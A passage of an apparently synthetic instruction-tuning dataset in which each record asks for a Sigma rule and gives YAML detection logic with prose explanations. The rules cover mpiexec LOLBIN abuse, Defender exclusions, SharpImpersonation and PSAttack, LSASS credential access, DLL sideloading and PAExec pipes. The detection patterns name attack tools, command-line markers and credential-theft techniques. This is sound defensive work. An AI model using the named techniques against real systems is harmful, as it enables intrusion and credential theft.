    "instruction": "Build a Sigma rule with the goal of detecting certain command line flag combination used by mpiexec.exe LOLBIN from HPC pack that can be used to execute any other binary.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a certain command line flag combination used by mpiexec.exe LOLBIN from HPC Pack that can be used to execute any other binary, you should focus on monitoring process creation events within Windows environments. Specifically, pay attention to instances where the mpiexec.exe file is being executed, which can be identified either through the file's name ending with '\\mpiexec.exe', its Image Hash (Imphash) being 'd8b52ef6aaa3a81501bdfff9dbb96217', or any hashes containing the specific Imphash value 'd8b52ef6aaa3a81501bdfff9dbb96217'. Additionally, it's critical to watch for the execution of mpiexec.exe with specific command line flags (' /n 1 ' or ' -n 1 '), as these flags are indicative of an attempt to misuse the LOLBIN for potentially malicious purposes. Given the high-risk nature of these indicators, all detected conditions should be met before generating an alert to avoid false positives, although unknown false positives have been acknowledged.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_binary:\n        - Image|endswith: '\\mpiexec.exe'\n        - Imphash: 'd8b52ef6aaa3a81501bdfff9dbb96217'\n        - Hashes|contains: 'IMPHASH=d8b52ef6aaa3a81501bdfff9dbb96217'\n    selection_flags:\n        CommandLine|contains:\n            - ' /n 1 '\n            - ' -n 1 '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_binary:\n        - Image|endswith: '\\mpiexec.exe'\n        - Imphash: 'd8b52ef6aaa3a81501bdfff9dbb96217'\n        - Hashes|contains: 'IMPHASH=d8b52ef6aaa3a81501bdfff9dbb96217'\n    selection_flags:\n        CommandLine|contains:\n            - ' /n 1 '\n            - ' -n 1 '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "certain command line flag combination used by mpiexec.exe LOLBIN from HPC pack that can be used to execute any other binary",
      "answer": "In order to detect a certain command line flag combination used by mpiexec.exe LOLBIN from HPC Pack that can be used to execute any other binary, you should focus on monitoring process creation events within Windows environments. Specifically, pay attention to instances where the mpiexec.exe file is being executed, which can be identified either through the file's name ending with '\\mpiexec.exe', its Image Hash (Imphash) being 'd8b52ef6aaa3a81501bdfff9dbb96217', or any hashes containing the specific Imphash value 'd8b52ef6aaa3a81501bdfff9dbb96217'. Additionally, it's critical to watch for the execution of mpiexec.exe with specific command line flags (' /n 1 ' or ' -n 1 '), as these flags are indicative of an attempt to misuse the LOLBIN for potentially malicious purposes. Given the high-risk nature of these indicators, all detected conditions should be met before generating an alert to avoid false positives, although unknown false positives have been acknowledged."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Setting of Windows Defender Exclusions.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the setting of Windows Defender exclusions, you should: Monitor Windows Defender (WinDefend) logs for events indicating the configuration of the antimalware platform has changed. Specifically, look for EventID 5007, which signifies that there has been a change in the antimalware platform's configuration. Pay close attention to changes which include the addition of new exclusions paths, especially those containing the string '\\Microsoft\\Windows Defender\\Exclusions'. This can be an indicator of an attacker trying to exclude certain files or directories from being scanned by Windows Defender, potentially allowing malicious software to run undetected on the system. Be aware that legitimate administrator actions can also trigger these alerts, so consider these as potential false positives. The severity of this action is considered medium due to its potential use in bypassing Windows Defender's detection capabilities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: windefend\ndetection:\n    selection:\n        EventID: 5007 # The antimalware platform configuration changed.\n        NewValue|contains: '\\Microsoft\\Windows Defender\\Exclusions'\n    condition: selection\nfalsepositives:\n    - Administrator actions\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: windefend\ndetection:\n    selection:\n        EventID: 5007 # The antimalware platform configuration changed.\n        NewValue|contains: '\\Microsoft\\Windows Defender\\Exclusions'\n    condition: selection\nfalsepositives:\n    - Administrator actions\nlevel: medium\n",
      "question": "Setting of Windows Defender Exclusions",
      "answer": "In order to detect the setting of Windows Defender exclusions, you should: Monitor Windows Defender (WinDefend) logs for events indicating the configuration of the antimalware platform has changed. Specifically, look for EventID 5007, which signifies that there has been a change in the antimalware platform's configuration. Pay close attention to changes which include the addition of new exclusions paths, especially those containing the string '\\Microsoft\\Windows Defender\\Exclusions'. This can be an indicator of an attacker trying to exclude certain files or directories from being scanned by Windows Defender, potentially allowing malicious software to run undetected on the system. Be aware that legitimate administrator actions can also trigger these alerts, so consider these as potential false positives. The severity of this action is considered medium due to its potential use in bypassing Windows Defender's detection capabilities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the SharpImpersonation tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of the SharpImpersonation tool, which can be used to manipulate tokens on Windows computers remotely (PsExec/WmiExec) or interactively, you should focus on monitoring the creation of processes within Windows environment. Look specifically for any processes that either are named 'SharpImpersonation.exe' or have an original filename of 'SharpImpersonation.exe'. Additionally, pay close attention to any command line usage that includes key phrases such as 'user:' in conjunction with either 'binary:' or 'shellcode:', and also watch for references to 'technique:CreateProcessAsUserW' or 'technique:ImpersonateLoggedOnUser'. These indicators are critical for spotting potential misuse of the SharpImpersonation tool. Be aware that the certainty level of these detections is considered high, although there might be instances where the rule could trigger false positives, the nature of which is currently unknown.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpImpersonation.exe'\n        - OriginalFileName: 'SharpImpersonation.exe'\n    selection_cli:\n        - CommandLine|contains|all:\n            - ' user:'\n            - ' binary:'\n        - CommandLine|contains|all:\n            - ' user:'\n            - ' shellcode:'\n        - CommandLine|contains:\n            - ' technique:CreateProcessAsUserW'\n            - ' technique:ImpersonateLoggedOnuser'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpImpersonation.exe'\n        - OriginalFileName: 'SharpImpersonation.exe'\n    selection_cli:\n        - CommandLine|contains|all:\n            - ' user:'\n            - ' binary:'\n        - CommandLine|contains|all:\n            - ' user:'\n            - ' shellcode:'\n        - CommandLine|contains:\n            - ' technique:CreateProcessAsUserW'\n            - ' technique:ImpersonateLoggedOnuser'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "execution of the SharpImpersonation tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively",
      "answer": "In order to detect execution of the SharpImpersonation tool, which can be used to manipulate tokens on Windows computers remotely (PsExec/WmiExec) or interactively, you should focus on monitoring the creation of processes within Windows environment. Look specifically for any processes that either are named 'SharpImpersonation.exe' or have an original filename of 'SharpImpersonation.exe'. Additionally, pay close attention to any command line usage that includes key phrases such as 'user:' in conjunction with either 'binary:' or 'shellcode:', and also watch for references to 'technique:CreateProcessAsUserW' or 'technique:ImpersonateLoggedOnUser'. These indicators are critical for spotting potential misuse of the SharpImpersonation tool. Be aware that the certainty level of these detections is considered high, although there might be instances where the rule could trigger false positives, the nature of which is currently unknown."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of PSAttack PowerShell hack tool.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of PSAttack PowerShell hack tool, you should: Focus on monitoring PowerShell scripts within the Windows environment, specifically looking into the Script Block Logging feature. This is predicated on having Script Block Logging enabled to properly log script activity. Your detection mechanism should key in on identifying scripts that contain the specific text 'PS ATTACK!!!'. This method of detection is categorized under PowerShell script monitoring (ps_script) and is crucial for identifying instances where the PSAttack tool might be employed. Mark any detections with a high level of concern due to the potential severity of such tool usage in your environment. The absence of known false positives highlights the specificity of this detection criterion, although it remains important to consider the context within which the script was found to ensure accurate interpretation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: 'PS ATTACK!!!'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: 'PS ATTACK!!!'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "use of PSAttack PowerShell hack tool",
      "answer": "In order to detect the use of PSAttack PowerShell hack tool, you should: Focus on monitoring PowerShell scripts within the Windows environment, specifically looking into the Script Block Logging feature. This is predicated on having Script Block Logging enabled to properly log script activity. Your detection mechanism should key in on identifying scripts that contain the specific text 'PS ATTACK!!!'. This method of detection is categorized under PowerShell script monitoring (ps_script) and is crucial for identifying instances where the PSAttack tool might be employed. Mark any detections with a high level of concern due to the potential severity of such tool usage in your environment. The absence of known false positives highlights the specificity of this detection criterion, although it remains important to consider the context within which the script was found to ensure accurate interpretation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting DLL sideloading of system dlls that are not present on the system by default. Usually to achieve techniques such as UAC bypass and privilege escalation.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect DLL sideloading of system dlls that are not present on the system by default, usually to achieve techniques such as UAC bypass and privilege escalation, you should: Focus on monitoring image load events within Windows environments, specifically targeting the loading of certain system DLLs that are inherently not present by default on the system. These DLLs include 'C:\\Windows\\System32\\WLBSCTRL.dll', 'C:\\Windows\\System32\\TSMSISrv.dll', 'C:\\Windows\\System32\\TSVIPSrv.dll', 'C:\\Windows\\System32\\wow64log.dll', 'C:\\Windows\\System32\\WptsExtensions.dll', and 'C:\\Windows\\System32\\wbem\\wbemcomn.dll'. Additionally, it is critical to differentiate between legitimate and illegitimate loading of these DLLs by filtering out the events where the loaded DLLs are signed by Microsoft Windows. This ensures that the focus remains only on potentially malicious activity, reducing the chances of flagging legitimate system processes. Be aware that due to the nature of this detection method, there may be unknown false positives. The overarching goal is to capture attempts at escalation of privileges or bypassing of User Account Control (UAC) by malicious actors through the sideloading technique. This method is associated with tactics and techniques such as privilege escalation and defense evasion but always remain alert to the possibility of legitimate software behavior erroneously triggering an alert.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded:\n            # Add other DLLs\n            - 'C:\\Windows\\System32\\WLBSCTRL.dll'\n            - 'C:\\Windows\\System32\\TSMSISrv.dll'\n            - 'C:\\Windows\\System32\\TSVIPSrv.dll'\n            - 'C:\\Windows\\System32\\wow64log.dll'\n            - 'C:\\Windows\\System32\\WptsExtensions.dll'\n            - 'C:\\Windows\\System32\\wbem\\wbemcomn.dll'\n    filter_ms_signed:\n        Signed: 'true'\n        # There could be other signatures (please add when found)\n        Signature: 'Microsoft Windows'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded:\n            # Add other DLLs\n            - 'C:\\Windows\\System32\\WLBSCTRL.dll'\n            - 'C:\\Windows\\System32\\TSMSISrv.dll'\n            - 'C:\\Windows\\System32\\TSVIPSrv.dll'\n            - 'C:\\Windows\\System32\\wow64log.dll'\n            - 'C:\\Windows\\System32\\WptsExtensions.dll'\n            - 'C:\\Windows\\System32\\wbem\\wbemcomn.dll'\n    filter_ms_signed:\n        Signed: 'true'\n        # There could be other signatures (please add when found)\n        Signature: 'Microsoft Windows'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "DLL sideloading of system dlls that are not present on the system by default. Usually to achieve techniques such as UAC bypass and privilege escalation",
      "answer": "In order to detect DLL sideloading of system dlls that are not present on the system by default, usually to achieve techniques such as UAC bypass and privilege escalation, you should: Focus on monitoring image load events within Windows environments, specifically targeting the loading of certain system DLLs that are inherently not present by default on the system. These DLLs include 'C:\\Windows\\System32\\WLBSCTRL.dll', 'C:\\Windows\\System32\\TSMSISrv.dll', 'C:\\Windows\\System32\\TSVIPSrv.dll', 'C:\\Windows\\System32\\wow64log.dll', 'C:\\Windows\\System32\\WptsExtensions.dll', and 'C:\\Windows\\System32\\wbem\\wbemcomn.dll'. Additionally, it is critical to differentiate between legitimate and illegitimate loading of these DLLs by filtering out the events where the loaded DLLs are signed by Microsoft Windows. This ensures that the focus remains only on potentially malicious activity, reducing the chances of flagging legitimate system processes. Be aware that due to the nature of this detection method, there may be unknown false positives. The overarching goal is to capture attempts at escalation of privileges or bypassing of User Account Control (UAC) by malicious actors through the sideloading technique. This method is associated with tactics and techniques such as privilege escalation and defense evasion but always remain alert to the possibility of legitimate software behavior erroneously triggering an alert."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting process access to LSASS memory with suspicious access flags 0x410 and 0x01410 (spin-off of similar rule).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect process access to LSASS memory with suspicious access flags 0x410 and 0x01410 (spin-off of similar rule), you should:\n\nMonitor Windows process access logs, specifically looking for instances where processes are attempting to access the memory of 'lsass.exe' using access flags that end with '10'. This could indicate a malicious attempt to read or manipulate the Local Security Authority Subsystem Service (LSASS) process memory, potentially for credential theft or other nefarious purposes. It is crucial to exclude activity from a predefined list of legitimate software paths that are known to access LSASS for valid reasons. This list includes a variety of system utilities, antivirus programs, and other trusted software, such as Task Manager, Malwarebytes, Windows Defender, VMware Tools, and several others, to minimize false positives.\n\nAdditionally, pay close attention to exclude accesses that are normal for Windows Defender processes, Microsoft Gaming Services, Process Explorer, VMware Tools, antivirus and Endpoint Detection and Response (EDR) agents, as well as specific Microsoft products and various other legitimate applications that might otherwise trigger alerts for benign behavior. Also, it is important to filter out accesses with certain patterns in the 'SourceImage' that are known to cause false positives, including legitimate programs running from common directories, maintenance tools, gaming software, development tools, and application updates.\n\nTag this activity with relevant tactics and techniques such as Credential Access and the specific technique that involves accessing LSASS memory, while maintaining awareness of potential false positives such as legitimate software needing to access the LSASS process for valid reasons. Always review the specific user, source image path, and granted access rights involved in the alert for further analysis and verification.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|endswith: '10'\n    # Absolute paths to programs that cause false positives\n    filter1:\n        SourceImage:\n            - 'C:\\WINDOWS\\system32\\taskmgr.exe'\n            - 'C:\\Program Files\\Malwarebytes\\Anti-Malware\\MBAMService.exe'\n            - 'C:\\PROGRAMDATA\\MALWAREBYTES\\MBAMSERVICE\\ctlrupdate\\mbupdatr.exe'\n            - 'C:\\WINDOWS\\system32\\taskhostw.exe'\n            - 'C:\\Program Files\\Windows Defender\\MsMpEng.exe'\n            - 'C:\\Windows\\SysWOW64\\msiexec.exe'\n            - 'C:\\Windows\\System32\\msiexec.exe'\n            - 'C:\\Windows\\System32\\lsass.exe'\n            - 'C:\\WINDOWS\\System32\\perfmon.exe'\n            - 'C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe'\n            - 'C:\\Windows\\sysWOW64\\wbem\\wmiprvse.exe'\n            - 'C:\\Program Files\\Common Files\\McAfee\\MMSSHost\\MMSSHOST.exe'\n    # Windows Defender\n    filter2:\n        SourceImage|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\'\n        SourceImage|endswith: '\\MsMpEng.exe'\n    # Microsoft Gaming Services\n    filter3:\n        SourceImage|startswith: 'C:\\Program Files\\WindowsApps\\'\n        SourceImage|endswith: '\\GamingServices.exe'\n    # Process Explorer\n    filter4:\n        SourceImage|endswith:\n            - '\\PROCEXP64.EXE'\n            - '\\PROCEXP.EXE'\n    # VMware Tools\n    filter5:\n        SourceImage|startswith: 'C:\\ProgramData\\VMware\\VMware Tools\\'\n        SourceImage|endswith: '\\vmtoolsd.exe'\n    # Antivirus and EDR agents\n    filter6:\n        SourceImage|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n        SourceImage|contains: 'Antivirus'\n    filter_nextron:\n        # SourceImage|startswith: 'C:\\Windows\\Temp\\asgard2-agent\\'  # Can be a manual THOR installation\n        SourceImage|endswith:\n            - '\\thor64.exe'\n            - '\\thor.exe'\n            - '\\aurora-agent-64.exe'\n            - '\\aurora-agent.exe'\n    filter_ms_products:\n        SourceImage|contains|all:\n            - '\\AppData\\Local\\Temp\\'\n            - '\\vs_bootstrapper_'\n        GrantedAccess: '0x1410'\n    # Generic Filter for 0x1410 filter (caused by so many programs like DropBox updates etc.)\n    filter_generic:\n        SourceImage|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n            - 'C:\\WINDOWS\\system32\\'\n    filter_wer:\n        SourceCommandLine: 'C:\\WINDOWS\\system32\\wermgr.exe -upload'\n    filter_localappdata:\n        SourceImage|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\Local\\'\n        SourceImage|endswith:\n            - '\\Microsoft VS Code\\Code.exe'\n            - '\\software_reporter_tool.exe'\n            - '\\DropboxUpdate.exe'\n            - '\\MBAMInstallerService.exe'\n            - '\\WebEx\\WebexHost.exe'\n            - '\\Programs\\Microsoft VS Code\\Code.exe'\n            - '\\JetBrains\\Toolbox\\bin\\jetbrains-toolbox.exe'\n    filter_xampp:\n        SourceImage|endswith: '\\xampp-control.exe'\n        GrantedAccess: '0x410'\n    filter_games:\n        SourceImage|contains: '\\SteamLibrary\\steamapps\\'\n        GrantedAccess:\n            - '0x410'\n            - '0x10'\n    condition: selection and not 1 of filter*\nfields:\n    - User\n    - SourceImage\n    - GrantedAccess\nfalsepositives:\n    - Legitimate software accessing LSASS process for legitimate reason\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|endswith: '10'\n    # Absolute paths to programs that cause false positives\n    filter1:\n        SourceImage:\n            - 'C:\\WINDOWS\\system32\\taskmgr.exe'\n            - 'C:\\Program Files\\Malwarebytes\\Anti-Malware\\MBAMService.exe'\n            - 'C:\\PROGRAMDATA\\MALWAREBYTES\\MBAMSERVICE\\ctlrupdate\\mbupdatr.exe'\n            - 'C:\\WINDOWS\\system32\\taskhostw.exe'\n            - 'C:\\Program Files\\Windows Defender\\MsMpEng.exe'\n            - 'C:\\Windows\\SysWOW64\\msiexec.exe'\n            - 'C:\\Windows\\System32\\msiexec.exe'\n            - 'C:\\Windows\\System32\\lsass.exe'\n            - 'C:\\WINDOWS\\System32\\perfmon.exe'\n            - 'C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe'\n            - 'C:\\Windows\\sysWOW64\\wbem\\wmiprvse.exe'\n            - 'C:\\Program Files\\Common Files\\McAfee\\MMSSHost\\MMSSHOST.exe'\n    # Windows Defender\n    filter2:\n        SourceImage|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\'\n        SourceImage|endswith: '\\MsMpEng.exe'\n    # Microsoft Gaming Services\n    filter3:\n        SourceImage|startswith: 'C:\\Program Files\\WindowsApps\\'\n        SourceImage|endswith: '\\GamingServices.exe'\n    # Process Explorer\n    filter4:\n        SourceImage|endswith:\n            - '\\PROCEXP64.EXE'\n            - '\\PROCEXP.EXE'\n    # VMware Tools\n    filter5:\n        SourceImage|startswith: 'C:\\ProgramData\\VMware\\VMware Tools\\'\n        SourceImage|endswith: '\\vmtoolsd.exe'\n    # Antivirus and EDR agents\n    filter6:\n        SourceImage|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n        SourceImage|contains: 'Antivirus'\n    filter_nextron:\n        # SourceImage|startswith: 'C:\\Windows\\Temp\\asgard2-agent\\'  # Can be a manual THOR installation\n        SourceImage|endswith:\n            - '\\thor64.exe'\n            - '\\thor.exe'\n            - '\\aurora-agent-64.exe'\n            - '\\aurora-agent.exe'\n    filter_ms_products:\n        SourceImage|contains|all:\n            - '\\AppData\\Local\\Temp\\'\n            - '\\vs_bootstrapper_'\n        GrantedAccess: '0x1410'\n    # Generic Filter for 0x1410 filter (caused by so many programs like DropBox updates etc.)\n    filter_generic:\n        SourceImage|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n            - 'C:\\WINDOWS\\system32\\'\n    filter_wer:\n        SourceCommandLine: 'C:\\WINDOWS\\system32\\wermgr.exe -upload'\n    filter_localappdata:\n        SourceImage|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\Local\\'\n        SourceImage|endswith:\n            - '\\Microsoft VS Code\\Code.exe'\n            - '\\software_reporter_tool.exe'\n            - '\\DropboxUpdate.exe'\n            - '\\MBAMInstallerService.exe'\n            - '\\WebEx\\WebexHost.exe'\n            - '\\Programs\\Microsoft VS Code\\Code.exe'\n            - '\\JetBrains\\Toolbox\\bin\\jetbrains-toolbox.exe'\n    filter_xampp:\n        SourceImage|endswith: '\\xampp-control.exe'\n        GrantedAccess: '0x410'\n    filter_games:\n        SourceImage|contains: '\\SteamLibrary\\steamapps\\'\n        GrantedAccess:\n            - '0x410'\n            - '0x10'\n    condition: selection and not 1 of filter*\nfields:\n    - User\n    - SourceImage\n    - GrantedAccess\nfalsepositives:\n    - Legitimate software accessing LSASS process for legitimate reason\nlevel: medium\n",
      "question": "process access to LSASS memory with suspicious access flags 0x410 and 0x01410 (spin-off of similar rule)",
      "answer": "In order to detect process access to LSASS memory with suspicious access flags 0x410 and 0x01410 (spin-off of similar rule), you should:\n\nMonitor Windows process access logs, specifically looking for instances where processes are attempting to access the memory of 'lsass.exe' using access flags that end with '10'. This could indicate a malicious attempt to read or manipulate the Local Security Authority Subsystem Service (LSASS) process memory, potentially for credential theft or other nefarious purposes. It is crucial to exclude activity from a predefined list of legitimate software paths that are known to access LSASS for valid reasons. This list includes a variety of system utilities, antivirus programs, and other trusted software, such as Task Manager, Malwarebytes, Windows Defender, VMware Tools, and several others, to minimize false positives.\n\nAdditionally, pay close attention to exclude accesses that are normal for Windows Defender processes, Microsoft Gaming Services, Process Explorer, VMware Tools, antivirus and Endpoint Detection and Response (EDR) agents, as well as specific Microsoft products and various other legitimate applications that might otherwise trigger alerts for benign behavior. Also, it is important to filter out accesses with certain patterns in the 'SourceImage' that are known to cause false positives, including legitimate programs running from common directories, maintenance tools, gaming software, development tools, and application updates.\n\nTag this activity with relevant tactics and techniques such as Credential Access and the specific technique that involves accessing LSASS memory, while maintaining awareness of potential false positives such as legitimate software needing to access the LSASS process for valid reasons. Always review the specific user, source image path, and granted access rights involved in the alert for further analysis and verification."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect creation of suspicious executable file name. Some strings look for suspicious file extensions, others look for filenames that exploit unquoted service paths..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect creation of suspicious executable file name. Some strings look for suspicious file extensions, others look for filenames that exploit unquoted service paths, you should: monitor Windows file event logs for the creation of executable files that either have misleading extensions such as '.bat.exe' or '.sys.exe', which may indicate an attempt to masquerade malicious files as innocent batch or system files. Additionally, watch for executable files being created with names that mimic critical Windows directories like 'C:\\$Recycle.Bin.exe', 'C:\\Documents and Settings.exe', 'C:\\MSOCache.exe', 'C:\\Recovery.exe', and 'C:\\PerfLogs.exe'. These names exploit unquoted service paths to potentially execute malicious code. Alerting on these conditions should be treated with high priority due to the likelihood of representing a malicious attempt to compromise the system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection_double:\n        TargetFilename|endswith:\n            - '.bat.exe'\n            - '.sys.exe'\n    selection_folder:\n        TargetFilename:\n            - 'C:\\$Recycle.Bin.exe'\n            - 'C:\\Documents and Settings.exe'\n            - 'C:\\MSOCache.exe'\n            - 'C:\\Recovery.exe'\n            - 'C:\\PerfLogs.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection_double:\n        TargetFilename|endswith:\n            - '.bat.exe'\n            - '.sys.exe'\n    selection_folder:\n        TargetFilename:\n            - 'C:\\$Recycle.Bin.exe'\n            - 'C:\\Documents and Settings.exe'\n            - 'C:\\MSOCache.exe'\n            - 'C:\\Recovery.exe'\n            - 'C:\\PerfLogs.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Detect creation of suspicious executable file name. Some strings look for suspicious file extensions, others look for filenames that exploit unquoted service paths.",
      "answer": "In order to detect creation of suspicious executable file name. Some strings look for suspicious file extensions, others look for filenames that exploit unquoted service paths, you should: monitor Windows file event logs for the creation of executable files that either have misleading extensions such as '.bat.exe' or '.sys.exe', which may indicate an attempt to masquerade malicious files as innocent batch or system files. Additionally, watch for executable files being created with names that mimic critical Windows directories like 'C:\\$Recycle.Bin.exe', 'C:\\Documents and Settings.exe', 'C:\\MSOCache.exe', 'C:\\Recovery.exe', and 'C:\\PerfLogs.exe'. These names exploit unquoted service paths to potentially execute malicious code. Alerting on these conditions should be treated with high priority due to the likelihood of representing a malicious attempt to compromise the system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting PAExec default named pipe.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect PAExec default named pipe, you should: Focus on monitoring the creation of named pipes in Windows systems, particularly through events that Sysmon logs under Event IDs 17 and 18, which pertain to pipe creation and connection events, respectively. To ensure these events are properly logged, you'll need to configure Sysmon with a configuration such as those available from popular repositories by SwiftOnSecurity, Neo23x0, or olafhartong. Effective detection hinges on identifying pipe names that start with '\\PAExec', a known indicator of the PAExec tool's usage, which might be leveraged by attackers for executing processes remotely. Although the activity's risk is regarded as medium, there exists a potential for false positives, which are currently undefined, indicating the need for cautious interpretation of detected events.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: pipe_created\n    product: windows\n    definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575'\ndetection:\n    selection:\n        PipeName|startswith: '\\PAExec'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: pipe_created\n    product: windows\n    definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575'\ndetection:\n    selection:\n        PipeName|startswith: '\\PAExec'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "PAExec default named pipe",
      "answer": "In order to detect PAExec default named pipe, you should: Focus on monitoring the creation of named pipes in Windows systems, particularly through events that Sysmon logs under Event IDs 17 and 18, which pertain to pipe creation and connection events, respectively. To ensure these events are properly logged, you'll need to configure Sysmon with a configuration such as those available from popular repositories by SwiftOnSecurity, Neo23x0, or olafhartong. Effective detection hinges on identifying pipe names that start with '\\PAExec', a known indicator of the PAExec tool's usage, which might be leveraged by attackers for executing processes remotely. Although the activity's risk is regarded as medium, there exists a potential for false positives, which are currently undefined, indicating the need for cautious interpretation of detected events."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of a new service (kernel driver) with the type \"kernel\".\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of a new service (kernel driver) with the type \"kernel\", you should: Look for the creation of processes on Windows systems where the process is ending with '\\sc.exe', indicating the Service Control Manager is used. The command line arguments should include 'create' or 'config', pointing towards the creation or configuration of a service, and must include 'binPath', 'type', and 'kernel' all together. These conditions suggest an attempt to install a kernel driver, which is a powerful mechanism that can be abused by attackers to execute code at a low level within the operating system. Note that there may be rare legitimate instances of installing kernel drivers via sc.exe, but generally, this activity should be scrutinized. The focus is mainly on monitoring process creation logs to catch such potentially malicious behavior.",
    "context": "",
